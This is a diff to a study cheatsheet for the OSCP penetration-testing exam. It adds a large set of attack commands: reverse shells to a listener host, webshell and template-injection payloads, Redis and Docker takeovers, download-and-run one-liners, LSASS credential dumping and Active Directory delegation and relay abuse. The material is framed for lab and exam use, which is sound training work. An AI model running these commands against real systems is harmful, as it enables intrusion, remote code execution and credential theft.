@@ -9,14 +9,14 @@ Study cheatsheet for **OSCP / OSCP+ (PEN-200)**. Re-read the official [OSCP+ Exa
 | [Exam day](#exam-day) | Scoring, proofs, restrictions, Metasploit lock, VPN, report upload |
 | [Methodology](#methodology) | Workspace, evidence clock, credential reuse, when stuck |
 | [Recon & port scanning](#reconnaissance--port-scanning) | Nmap TCP/UDP, NSE, port → next action |
-| [Services](#services) | FTP, SSH, SMB, SNMP, DNS, SMTP, NFS, RPC, LDAP, RDP, WinRM, DBs, Redis |
+| [Services](#services) | FTP, SSH, SMB, SNMP, DNS, SMTP, NFS, RPC, LDAP, RDP, WinRM, DBs, Redis, TFTP, rsync, Docker, Mongo |
 | [HTTP/S & web](#https--web) | Vhosts, dirs, CMS, LFI/RFI, SQLi, SSTI, upload, Git, Hydra |
 | [Fuzzing](#fuzzing) | ffuf, gobuster, feroxbuster |
 | [Shells & file transfer](#shells--file-transfer) | Reverse shells, TTY, msfvenom, Linux/Windows transfer |
 | [Linux privilege escalation](#linux-privilege-escalation) | sudo, SUID, caps, cron, NFS, Docker, GTFOBins |
 | [Windows privilege escalation](#windows-privilege-escalation) | Tokens, Potatoes, services, Backup Operators, SAM |
-| [Active Directory](#active-directory) | Assumed breach, BloodHound, roast, ACL, bloodyAD, lateral |
-| [Certificate abuse (ADCS)](#certificate-abuse-adcs) | Certipy / Certify, ESC overview, shadow credentials |
+| [Active Directory](#active-directory) | Assumed breach, BloodHound, roast, RBCD, ACL, bloodyAD, lateral |
+| [Certificate abuse (ADCS)](#certificate-abuse-adcs) | Certipy / Certify, ESC1/ESC8, shadow credentials |
 | [Tunneling & pivoting](#tunneling--pivoting) | Ligolo-ng, Chisel, Proxychains, SSH |
 | [Credentials & cracking](#credentials--cracking) | Spray strategy, John, Hashcat modes, defaults |
 | [Post-exploitation](#post-exploitation) | Loot, KeePass, history, internal ports |
@@ -79,11 +79,11 @@ Windows full points: shell as **SYSTEM**, **Administrator**, or Administrators. 
 
 ### Restrictions
 
-**Banned:** spoofing (IP/ARP/DNS/NBNS/LLMNR poison); automatic exploitation (**SQLmap**, SQLninja, db_autopwn); mass scanners (Nessus, OpenVAS); AI chatbots/LLMs during the **exam and the report** (ChatGPT, KAI, Gemini, Copilot, DeepSeek).
+**Banned:** spoofing (IP/ARP/DNS/NBNS/LLMNR poison); commercial Pro tools (Burp Pro, Metasploit Pro); automatic exploitation (**SQLmap**, SQLninja, db_autopwn); mass scanners (Nessus, OpenVAS); AI chatbots/LLMs during the **exam and the report** (ChatGPT, KAI, Gemini, Copilot, DeepSeek).
 
 Notion-style organisers and Google AI Overview are allowed. Interactive “ask the model to solve this” is not. [AI Usage Policy](https://help.offsec.com/hc/en-us/articles/35549468971156-AI-Usage-Policy-in-OffSec-Exams).
 
-**Allowed examples (FAQ, not exhaustive):** Nmap/NSE, Nikto, Burp , DirBuster-style discovery, BloodHound Legacy/CE, SharpHound, PowerView, Rubeus, evil-winrm, CrackMapExec/NetExec, Mimikatz, Impacket, PrintSpoofer.
+**Allowed examples (FAQ, not exhaustive):** Nmap/NSE, Nikto, Burp Community, DirBuster-style discovery, BloodHound Legacy/CE, SharpHound, PowerView, Rubeus, evil-winrm, CrackMapExec/NetExec, Mimikatz, Impacket, PrintSpoofer.
 
 **Responder** is listed as allowed; **poisoning/spoofing is not**. Open book: notes, Google, OffSec platform. Do not discuss **this** exam anywhere.
 
@@ -158,10 +158,10 @@ Use `-Pn` if ICMP is blocked. Save output. Scan **all** exam hosts in parallel b
 export IP=<RHOST>
 
 sudo nmap -sC -sV --open -T4 "$IP" -oN scans/quick.txt          # basic
-sudo nmap -p- --min-rate 2000 -T4 "$IP" -oN scans/all-tcp.txt   # all TCP
+sudo nmap -p- --min-rate 1500 -T4 "$IP" -oN scans/all-tcp.txt   # all TCP (drop rate if VPN drops packets)
 sudo nmap -sC -sV -p <PORTS> "$IP" -oA scans/tcp-full           # scripts on open ports
 sudo nmap -T4 -A -p- "$IP" -v -oA scans/aggressive              # when you have time
-sudo nmap -sU --top-ports 20 "$IP" -oN scans/udp.txt            # SNMP/TFTP/DNS — do not skip
+sudo nmap -sU --top-ports 100 "$IP" -oN scans/udp.txt           # SNMP/TFTP/DNS — do not skip
 ```
 
 ```bash
@@ -199,21 +199,33 @@ searchsploit -m <id>
 | 22 | SSH | Reuse creds; crack `id_rsa` |
 | 25 / 587 | SMTP | VRFY / EXPN user enum |
 | 53 | DNS | `dig axfr`; hostnames → `/etc/hosts` |
+| 69/UDP | TFTP | `tftp <RHOST>` → `get`/`put` (no auth) |
+| 79 | Finger | user enum |
 | 80 / 443 / 8080 / 8443 | HTTP(S) | Web section; Tomcat/Jenkins on alt ports |
-| 88 | Kerberos | AD — roast + BloodHound |
+| 88 | Kerberos | AD — roast + BloodHound; `kerbrute` |
+| 110 / 143 | POP3 / IMAP | banner, default creds, reuse |
 | 111 | RPCbind | `rpcinfo -p`; NFS likely |
-| 135 / 139 / 445 | RPC / SMB | Null session, shares, RID |
+| 135 / 139 / 445 | RPC / SMB | Null session, shares, RID; `smb-vuln-ms17-010` |
 | 161/UDP | SNMP | `public`/`private`; users and processes |
 | 389 / 636 / 3268 | LDAP | namingContexts; descriptions |
+| 512–514 | rsh / rlogin / rexec | `.rhosts` / trusted hosts |
+| 873 | rsync | `rsync rsync://<RHOST>/` |
+| 1099 | Java RMI | version → searchsploit / ysoserial (lab) |
 | 1433 | MSSQL | `nxc mssql` / `impacket-mssqlclient` |
+| 1521 | Oracle | `scott/tiger`; searchsploit the version |
 | 2049 | NFS | `showmount -e`; `no_root_squash` |
+| 2375 | Docker API | unauth `docker -H tcp://<RHOST>:2375 ps` |
 | 3306 | MySQL | root/blank; reuse web config |
 | 3389 | RDP | `xfreerdp` / nxc; Restricted Admin with hash |
-| 5432 | PostgreSQL | `postgres`/`postgres` |
+| 5432 | PostgreSQL | `postgres`/`postgres`; `COPY ... PROGRAM` |
 | 5900 | VNC | Password in registry/files later |
 | 5985 / 5986 | WinRM | `evil-winrm`; nxc `(Pwn3d!)` |
 | 6379 | Redis | Unauth `INFO`; SSH key / webshell write |
-| 8009 | AJP | Tomcat |
+| 8009 | AJP | Tomcat (Ghostcat if unpatched) |
+| 9200 | Elasticsearch | unauth `/_cat/indices?v` |
+| 10000 | Webmin | default creds + version CVE |
+| 11211 | Memcached | `stats`, cached keys |
+| 27017 | MongoDB | unauth dump |
 | 9389 | ADWS | Confirms DC |
 
 ---
@@ -278,6 +290,7 @@ mget *
 ```bash
 nxc smb <RHOST> -u <USER> -p <PASS> -M spider_plus
 impacket-lookupsid '<DOMAIN>/guest'@<RHOST> -no-pass | grep SidTypeUser
+nmap -p 445 --script smb-vuln-ms17-010 <RHOST>   # EternalBlue if unpatched — searchsploit, not Metasploit unless that is your one host
 ```
 
 ```cmd
@@ -380,23 +393,88 @@ EXEC sp_linkedservers;
 
 Needs sysadmin for `xp_cmdshell`. Fetch a payload with `certutil` / `iwr` after `msfvenom`, then execute.
 
+```bash
+nxc mssql <RHOST> -u <USER> -p '<PASS>' -x whoami
+nxc mssql <RHOST> -u <USER> -p '<PASS>' --windows-auth -x whoami
+```
+
+`xp_dirtree '\\<LHOST>\share'` can coerce SMB auth if you already have an allowed listener (no LLMNR poison).
+
 ### MySQL / PostgreSQL / Redis
 
 ```bash
 mysql -h <RHOST> -u root -p
+# FILE priv → SELECT ... INTO OUTFILE '/var/www/html/shell.php'
 psql -h <RHOST> -U postgres
-redis-cli -h <RHOST> INFO
-redis-cli -h <RHOST> CONFIG GET dir
+# superuser: COPY cmd_out FROM PROGRAM 'id';
+redis-cli -h <RHOST>
+INFO
+CONFIG GET dir
+CONFIG GET dbfilename
 ```
 
-Reuse `wp-config.php` / `.env` / `web.config`. Local-only DB → tunnel then `127.0.0.1`. Unauth Redis can write `authorized_keys` or a webshell (lab/exam hosts only).
+Reuse `wp-config.php` / `.env` / `web.config`. Local-only DB → tunnel then `127.0.0.1`.
+
+Unauth Redis (lab/exam hosts only) — SSH key:
+
+```bash
+# Kali
+ssh-keygen -f redis_key -t rsa -N ''
+(echo -n '\n'; cat redis_key.pub; echo -n '\n') > redis_key_pad.txt
+redis-cli -h <RHOST> flushall
+cat redis_key_pad.txt | redis-cli -h <RHOST> -x set ssh
+redis-cli -h <RHOST> CONFIG SET dir /root/.ssh
+redis-cli -h <RHOST> CONFIG SET dbfilename authorized_keys
+redis-cli -h <RHOST> save
+ssh -i redis_key root@<RHOST>
+```
+
+Or `CONFIG SET dir` to a web root and `dbfilename` to `shell.php`.
+
+### TFTP / rsync / Mongo / Docker API
+
+```bash
+tftp <RHOST>
+# tftp> get <file>
+# tftp> put shell.php
+
+rsync rsync://<RHOST>/
+rsync -av rsync://<RHOST>/<MODULE>/ loot/
+# writable module → drop a key or webshell
+
+mongosh --host <RHOST> --eval 'db.adminCommand({listDatabases:1})'
+# mongodump if noauth
+
+curl -s http://<RHOST>:2375/version
+docker -H tcp://<RHOST>:2375 ps
+docker -H tcp://<RHOST>:2375 run -v /:/mnt --rm -it alpine chroot /mnt sh
+```
+
+### Tomcat / Jenkins / WebDAV
+
+```bash
+# Tomcat manager → WAR
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o shell.war
+curl -u 'tomcat:s3cret' --upload-file shell.war \
+  http://<RHOST>:8080/manager/text/deploy?path=/shell
+# browse /shell
+
+# Jenkins /script (Groovy)
+# def p = ['/bin/bash','-c','bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'].execute()
+
+curl -X OPTIONS http://<RHOST>/
+curl -X PUT http://<RHOST>/shell.php --data-binary @shell.php
+cadaver http://<RHOST>/
+```
 
 | App | Defaults |
 | --- | --- |
 | Tomcat `/manager` | `tomcat:tomcat`, `admin:admin`, `tomcat:s3cret` → WAR |
-| Jenkins | `/script` Groovy if you get in |
+| Jenkins | `admin:admin` / blank; `/script` Groovy |
 | phpMyAdmin | reuse MySQL creds |
 | WebDAV | `davtest`; PUT aspx/php |
+| Grafana | `admin:admin` |
+| Webmin | `admin:admin` + version CVE |
 
 ---
 
@@ -444,7 +522,28 @@ php://filter/convert.base64-encode/resource=/var/www/html/config.php
 echo '<BASE64>' | base64 -d
 ```
 
-Also try `~/.ssh/id_rsa`, `.env`, `web.config`, `unattend.xml`. RFI needs `allow_url_include` — host `http://<LHOST>/shell.txt`.
+Also try `~/.ssh/id_rsa`, `.env`, `web.config`, `unattend.xml`, `/proc/self/environ`, PHP session files under `/var/lib/php/sessions/`. RFI needs `allow_url_include` — host `http://<LHOST>/shell.txt`.
+
+Log poison → include the log (User-Agent or SSH username):
+
+```bash
+curl -A '<?php system($_GET["c"]); ?>' http://<RHOST>/
+# then LFI: /var/log/apache2/access.log  or  /var/log/nginx/access.log  or  /var/log/auth.log
+```
+
+`/cgi-bin/` + old Bash → Shellshock: `() { :; }; /bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'`
+
+### SSRF / XXE (quick probes)
+
+```
+http://127.0.0.1:<PORT>/
+http://169.254.169.254/   # cloud metadata — skip if out of exam scope
+file:///etc/passwd
+```
+
+```xml
+<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>
+```
 
 ### Command injection / SSTI / upload
 
@@ -456,9 +555,13 @@ Probes: `; | || && & \` $() %0a %3B` → `127.0.0.1; id`
 | `${7*7}` | FreeMarker / Mako |
 | `<%= 7*7 %>` | ERB |
 
-Lookup the **exact** engine before pasting an RCE gadget.
+Lookup the **exact** engine before pasting an RCE gadget. Common Jinja2 RCE:
 
-Upload bypass: Content-Type `image/jpeg`, magic `GIF89a`, `shell.php.jpg`, `shell.pHp`, `.phtml` `.phar` `.aspx`. If `/cgi-bin/` exists, fuzz `.sh` `.pl`.
+```
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+```
+
+Upload bypass: Content-Type `image/jpeg`, magic `GIF89a`, `shell.php.jpg`, `shell.pHp`, `.phtml` `.phar` `.aspx`. If `/cgi-bin/` exists, fuzz `.sh` `.pl`. WordPress: `/xmlrpc.php` + `wpscan --enumerate u` then brute; theme/plugin editor if you get wp-admin.
 
 ### SQL injection (manual)
 
@@ -488,7 +591,7 @@ cd dump && git status && git log && git diff && git show
 
 [GitHacker](https://github.com/WangYihang/GitHacker). Deleted creds live in old commits.
 
-Fuzz `/api/v1/FUZZ`, `/swagger`, `/openapi.json`.
+Fuzz `/api/v1/FUZZ`, `/swagger`, `/openapi.json`, `/actuator`, `/console` (Werkzeug), `/jolokia`.
 
 ---
 
@@ -596,7 +699,10 @@ nc -lvnp 1234 > loot.bin
 ```powershell
 iwr -uri http://<LHOST>:8001/file.exe -Outfile C:\Windows\Tasks\file.exe
 certutil -urlcache -split -f http://<LHOST>:8001/file.exe C:\Temp\file.exe
+curl.exe -o C:\Temp\file.exe http://<LHOST>:8001/file.exe
+bitsadmin /transfer n http://<LHOST>:8001/file.exe C:\Temp\file.exe
 copy \\<LHOST>\share\file.exe .
+IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/script.ps1')
 ```
 
 ```bash
@@ -659,10 +765,12 @@ echo '/bin/bash -p' > /tmp/curl && chmod +x /tmp/curl
 
 ```bash
 cat /etc/crontab
-ls -la /etc/cron.* /var/spool/cron/crontabs 2>/dev/null
+ls -la /etc/cron.* /var/spool/cron/crontabs /etc/sudoers.d 2>/dev/null
+systemctl list-timers --all
+find / -writable -type f 2>/dev/null | grep -vE '/proc|/sys|/dev'
 ```
 
-Writable root cron script → append a reverse shell. Wildcard `tar *` → GTFOBins tar.
+Writable root cron / systemd unit → append a reverse shell. Wildcard `tar *` → GTFOBins tar. Writable Python on `sudo` PYTHONPATH / `sitecustomize.py` hijack.
 
 ```bash
 openssl passwd -1 'NewPass123!'
@@ -818,7 +926,19 @@ impacket-secretsdump -ntds ntds.dit -system SYSTEM local
 
 [SeBackupPrivilege](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/) · [Backup Operator](https://www.bordergate.co.uk/backup-operator-privilege-escalation/).
 
-After SYSTEM: Mimikatz `privilege::debug` + `sekurlsa::logonpasswords` / `lsadump::sam` / `lsadump::secrets`, then PTH/spray.
+LSASS without Mimikatz (then parse on Kali):
+
+```cmd
+reg save HKLM\SECURITY C:\Windows\Tasks\SECURITY
+rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Windows\Tasks\lsass.dmp full
+```
+
+```bash
+impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY local
+pypykatz lsa minidump lsass.dmp
+```
+
+After SYSTEM: Mimikatz `privilege::debug` + `sekurlsa::logonpasswords` / `lsadump::sam` / `lsadump::secrets`, then PTH/spray. `nxc smb <RHOST> -u <ADMIN> -H '<NTHASH>' --sam --lsa` from Kali if 445 is open.
 
 ---
 
@@ -829,7 +949,12 @@ Assumed breach: the panel gives a low-priv domain user. Points: MS01 10, MS02 10
 ```bash
 nxc smb <DC> -u '<USER>' -p '<PASS>' --shares --users --groups --pass-pol
 nxc ldap <DC> -u '<USER>' -p '<PASS>'
+nxc ldap <DC> -u '<USER>' -p '<PASS>' --asreproast asrep.txt
+nxc ldap <DC> -u '<USER>' -p '<PASS>' --kerberoasting roast.txt
 nxc winrm <MS01> -u '<USER>' -p '<PASS>'
+nxc smb <NET>/24 -u '<USER>' -p '<PASS>' --continue-on-success   # Pwn3d! = local admin
+kerbrute userenum --dc <DC> -d <DOMAIN> users.txt
+ldapdomaindump -u '<DOMAIN>\<USER>' -p '<PASS>' ldap://<DC> -o ldap_out
 ```
 
 Read lockout **before** spraying.
@@ -880,12 +1005,16 @@ nxc winrm <NET>/24 -u '<USER>' -H '<NTHASH>' --continue-on-success
 ```bash
 impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC> -request
 impacket-GetNPUsers '<DOMAIN>/' -dc-ip <DC> -usersfile users.txt -format hashcat -outputfile asrep.txt
+impacket-getTGT '<DOMAIN>/<USER>' -hashes :<NTHASH> -dc-ip <DC>
+export KRB5CCNAME=<USER>.ccache
 impacket-secretsdump '<DOMAIN>/<ADMIN>:<PASS>'@<DC>
 impacket-secretsdump '<DOMAIN>/<ADMIN>@<DC>' -hashes :<NTHASH>
 
 impacket-wmiexec '<DOMAIN>/<USER>@<RHOST>' -hashes :<NTHASH>
+impacket-dcomexec '<DOMAIN>/<USER>@<RHOST>' -hashes :<NTHASH>
 evil-winrm -i <RHOST> -u <USER> -H <NTHASH>
 nxc smb <RHOST> -u <USER> -H <NTHASH>
+nxc smb <RHOST> -u <USER> -H '<NTHASH>' --sam --lsa
 export KRB5CCNAME=Administrator.ccache
 impacket-psexec '<DOMAIN>/administrator@<DC>' -k -no-pass
 ```
@@ -909,6 +1038,24 @@ kerberos::golden /User:Administrator /domain:<DOMAIN> /sid:<SID> /krbtgt:<KRBTGT
 ```
 
 Do not use LLMNR poison for unconstrained coercion on the exam.
+
+### RBCD / targeted Kerberoast / MAQ
+
+GenericWrite or GenericAll on a **computer**, or `ms-DS-MachineAccountQuota` > 0:
+
+```bash
+impacket-addcomputer '<DOMAIN>/<USER>:<PASS>' -computer-name 'FAKE$' -computer-pass 'Passw0rd!' -dc-host <DC>
+impacket-rbcd -delegate-from 'FAKE$' -delegate-to 'TARGET$' -dc-ip <DC> -action write '<DOMAIN>/<USER>:<PASS>'
+impacket-getST -spn 'cifs/TARGET.<DOMAIN>' -impersonate Administrator -dc-ip <DC> '<DOMAIN>/FAKE$:Passw0rd!'
+export KRB5CCNAME=Administrator.ccache
+```
+
+WriteSPN on a user (targeted Kerberoast):
+
+```bash
+bloodyAD --host <DC> -d <DOMAIN> -u <USER> -p '<PASS>' set object '<TARGET>' servicePrincipalName -v 'http/fake'
+impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC> -request-user '<TARGET>'
+```
 
 ### bloodyAD / ACL
 
@@ -990,6 +1137,14 @@ certipy-ad template -username '<USER>@<DOMAIN>' -password '<PASS>' -dc-ip <DC> -
 
 If Certipy wants the request twice, restore the original UPN first. Revert templates with the saved JSON.
 
+ESC8 (HTTP enrollment, **no** LLMNR poison): only if you already have an in-scope coerce (e.g. `xp_dirtree`, a file on a share the victim will open):
+
+```bash
+impacket-ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+```
+
+Then `certipy auth -pfx ...`.
+
 ---
 
 ## Tunneling & pivoting
@@ -1022,12 +1177,14 @@ Kali: `nc -lvnp 4444`. Internal victim connects to **the agent host:1234**. Same
 
 ```bash
 chisel server -p 9001 --reverse
-# victim: chisel.exe client <LHOST>:9001 R:socks
+# victim socks: chisel.exe client <LHOST>:9001 R:socks
+# one port:     chisel.exe client <LHOST>:9001 R:3389:127.0.0.1:3389
 ```
 
 `/etc/proxychains4.conf`: `socks5 127.0.0.1 1080` (confirm the port). Quiet mode on once it works.
 
 ```bash
+socat TCP-LISTEN:8080,fork TCP:<INTERNAL>:80
 proxychains nxc smb hosts.txt -u '<USER>' -p '<PASS>' --continue-on-success
 proxychains evil-winrm -i <INTERNAL> -u '<USER>' -p '<PASS>'
 proxychains nmap -sT -Pn -n -p 445,3389,5985 <INTERNAL>
@@ -1067,6 +1224,8 @@ keepass2john Database.kdbx > keepass.hash
 fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip
 hashcat -m <MODE> hashes.txt /usr/share/wordlists/rockyou.txt
 hashcat -m <MODE> hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+cewl http://<RHOST>/ -w cewl.txt
+# then hydra/nxc with cewl.txt + company name mangling
 ```
 
 | `-m` | Type |
@@ -1079,6 +1238,7 @@ hashcat -m <MODE> hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
 | 2100 | DCC2 / mscache |
 | 13100 | Kerberoast TGS |
 | 18200 | AS-REP |
+| 13400 | KeePass (confirm with `--example-hashes`) |
 
 Open KeePass with KeePassXC; check for a keyfile next to the `.kdbx`.
 
